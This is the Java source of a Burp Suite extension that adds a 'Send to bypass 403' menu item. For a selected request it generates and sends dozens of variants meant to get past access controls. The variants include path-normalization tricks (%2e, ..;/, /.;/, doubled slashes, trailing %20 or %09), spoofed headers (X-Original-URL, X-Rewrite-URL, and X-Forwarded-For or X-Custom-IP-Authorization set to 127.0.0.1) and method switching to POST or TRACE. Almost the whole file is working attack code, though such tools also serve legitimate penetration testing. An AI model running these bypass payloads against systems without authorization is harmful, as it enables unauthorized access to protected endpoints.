package Main;

import burp.BurpExtender;
import burp.IContextMenuFactory;
import burp.IContextMenuInvocation;
import burp.IHttpRequestResponse;
import org.apache.commons.lang3.StringUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;

public class BypassMain implements IContextMenuFactory {
    public List<BaseRequest> make_suffix(String prefix, String target) {
        List<BaseRequest> baseRequestList = new ArrayList();
        Map<String, String> headers = new HashMap();


        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target, null));

        baseRequestList.add(new BaseRequest("GET",  prefix + "/%2e/" + target, null));
        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target + "/.", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target + "/", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/./" + target + "/./", null));

        headers.put("X-Original-URL", target);
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Custom-IP-Authorization", "127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "http://127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-Forwarded-For", "127.0.0.1:80");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        headers.put("X-rewrite-url", prefix + "/" +target);
        baseRequestList.add(new BaseRequest("GET",   "/" , (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "%20", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" +target + "%09", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "?", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".html", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "/?error", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "#", null));

        headers.put("Content-Length", "0");
        baseRequestList.add(new BaseRequest("POST",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "/*", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".json", null));

        baseRequestList.add(new BaseRequest("TRACE",   prefix + "/" + target, null));

        headers.put("X-Host", "127.0.0.1");
        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
        headers.clear();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "..;/", null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/;/" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/.;/" + target, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + URLParamEncoder.encode(target), null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/images;/../" + target, null));
        baseRequestList.add(new BaseRequest("GET",   prefix + "/images/..;/" + target, null));

        return baseRequestList;

    }

    public List<BaseRequest> make_prefix(String prefix, String suffix, String target) {
        List<BaseRequest> baseRequestList = new ArrayList();

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ";/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/images/..;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/images;/../" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",  prefix + "/%2e/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",  prefix + "/" + target + "/." + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target + "/" + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "//" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/./" + target + "/./" + suffix, null));


        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "%20" + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" +target + "%09" + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + "..;/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/.;/" + target + "/" + suffix, null));

        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + URLParamEncoder.encode(target) + "/" + suffix, null));

        return baseRequestList;
    }

    public List<BaseRequest> make_payload(String path) {
        path = path.substring(1);

        Boolean isEnd = false;

        if(path.endsWith("/")) {
            path = path.substring(0, path.length()-1);
            isEnd = true;
        }
        String[] paths = path.split("/");

        String target = "";
        String prefix = "";
        String suffix = "";

        // 对结尾进行fuzz
        target = paths[paths.length-1];
        String[] new_paths = Arrays.copyOfRange(paths, 0, paths.length-1);
        prefix = StringUtils.join(new_paths, "/");
        prefix = "/" + prefix;
        if (prefix.endsWith("/")) {
            prefix = prefix.substring(0, prefix.length()-1);
        }



        List<BaseRequest> allRequests = new ArrayList();

        if(isEnd) {
            allRequests.addAll(make_suffix(prefix, target + "/"));
            allRequests.addAll(make_suffix(prefix, target));
        } else {
            allRequests.addAll(make_suffix(prefix, target));
        }


//        allRequests.addAll(make_suffix(prefix, target + "/"));
//
//        allRequests.addAll(make_suffix(prefix, target));



        // 对负一节点进行fuzz
        if (paths.length > 1) {
            suffix = paths[paths.length-1];
            target = paths[paths.length-2];

            if (paths.length == 2) {
                prefix = "";
            }else if (paths.length > 2) {
                String[] prefix_paths = Arrays.copyOfRange(paths, 0, paths.length-2);
                prefix = StringUtils.join(prefix_paths, "/");

                prefix = "/" + prefix;
                if (prefix.endsWith("/")) {
                    prefix = prefix.substring(0, prefix.length()-1);
                }

            }


            allRequests.addAll(make_prefix(prefix, suffix, target));
        }

        return allRequests;

    }


    @Override
    public List<JMenuItem> createMenuItems(final IContextMenuInvocation invocation) {
        List<JMenuItem> list;
        list = new ArrayList<JMenuItem>();

        if(invocation != null && invocation.getSelectedMessages() != null && invocation.getSelectedMessages()[0] != null && invocation.getSelectedMessages()[0].getHttpService() != null) {
            JMenuItem jMenuItem = new JMenuItem("Send to bypass 403");

            jMenuItem.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[0];

                    String old_path = Utils.helpers.analyzeRequest(iHttpRequestResponse).getUrl().getPath();
                    String old_request = Utils.helpers.bytesToString(iHttpRequestResponse.getRequest());
                    String old_method = Utils.helpers.analyzeRequest(iHttpRequestResponse).getMethod();

                    new Thread(() -> {

                        List<BaseRequest> allRequests;
                        allRequests = make_payload(old_path);

                        for(BaseRequest baseRequest: allRequests) {

                            String method = baseRequest.method;
                            String path = baseRequest.path;
                            Map<String, String> headers = baseRequest.headers;
                            String new_request = "";

                            new_request = old_request.replaceFirst(old_path, path);
                            if (method == "GET") {
                                if (headers != null) {
                                    new_request = old_request.replaceFirst(old_path, path);

                                    for(Map.Entry<String, String> map: headers.entrySet()) {
                                        String key = map.getKey();
                                        String value = map.getValue();
                                        new_request = new_request.replaceFirst("User-Agent: ", key + ": " + value + "\r\nUser-Agent: ");
                                    }

                                }
                            } else if(method == "POST"){
                                if(old_method == "GET") {
                                    new_request = old_request.replaceFirst("GET", "POST");
                                } else if (old_method == "POST") {
                                    new_request = old_request.replaceFirst("POST", "GET");
                                }

                            } else if (method == "TRACE") {
                                if(old_method == "GET") {
                                    new_request = old_request.replaceFirst("GET", "TRACE");
                                } else if (old_method == "POST") {
                                    new_request = old_request.replaceFirst("POST", "TRACE");
                                }
                            }

                            try {
                                IHttpRequestResponse resRequestReponse = Utils.callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                                if (resRequestReponse != null) {
                                    addLog(resRequestReponse, 0, 0, 0);
                                }


                            }catch(Throwable ee) {

                            }

                        }
                    }).start();

                }
            });
            list.add(jMenuItem);
        }
        return list;
    }

    private void addLog(IHttpRequestResponse messageInfo, int toolFlag, long time, int row) {

        Utils.panel.getBypassTableModel().getBypassArray().add(new Bypass(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss").format(LocalDateTime.now()),
                Utils.helpers.analyzeRequest(messageInfo).getMethod(),
                String.valueOf(Utils.helpers.analyzeRequest(messageInfo).getBodyOffset()),
                Utils.callbacks.saveBuffersToTempFiles(messageInfo),
                Utils.helpers.analyzeRequest(messageInfo).getUrl(),
                Utils.helpers.analyzeResponse(messageInfo.getResponse()).getStatusCode(),
                Utils.helpers.analyzeResponse(messageInfo.getResponse()).getStatedMimeType(),
                time));
        Utils.panel.getBypassTableModel().fireTableRowsInserted(row, row);
    }
}
